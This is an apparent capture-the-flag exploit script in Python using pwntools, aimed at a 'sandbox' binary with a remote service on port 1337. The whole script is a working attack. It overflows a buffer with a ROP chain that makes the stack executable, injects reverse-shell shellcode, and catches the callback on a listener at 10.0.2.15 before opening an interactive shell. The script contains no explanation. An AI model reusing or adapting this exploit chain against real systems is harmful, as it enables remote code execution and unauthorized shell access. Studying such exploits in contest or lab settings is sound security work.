#!/usr/bin/python
from pwn import *
import os
from shellcode import rshell,shell
if 'remote' in os.environ:
	io = remote("sandbox.chung96vn.cf", 1337)
else:
	io = process(["./sandbox","./program"])
raw_input("Stage 1?")
log.info("Sending first payload")
rop = ''
rop += p64(0x00000000004150d4)+p64(0x6b8ef0) #pop rax with stack_prot
rop += p64(0x000000000044b856)+p64(7) # pop rdx
rop += p64(0x000000000048cc92) # mov dword ptr [rax], edx; ret
rop += p64(0x0000000000400686)+p64(0x6b8ab0) #pop rdi; libc_stack_end
rop += p64(0x47f780) #_dl_make_stack_executable
rop += p64(0x0000000000450524) #push rsp;ret
payload=cyclic(56)+rop+rshell
log.info("Payload length:%d"%len(payload))
assert(len(payload)<=0x100)
io.send(payload)
#sleep(1)
log.info(io.recv())
log.info("Sending shellcode")
io = server(1337,'10.0.2.15').next_connection()
io.send("/bin/sh\0"+shell)
io.interactive()
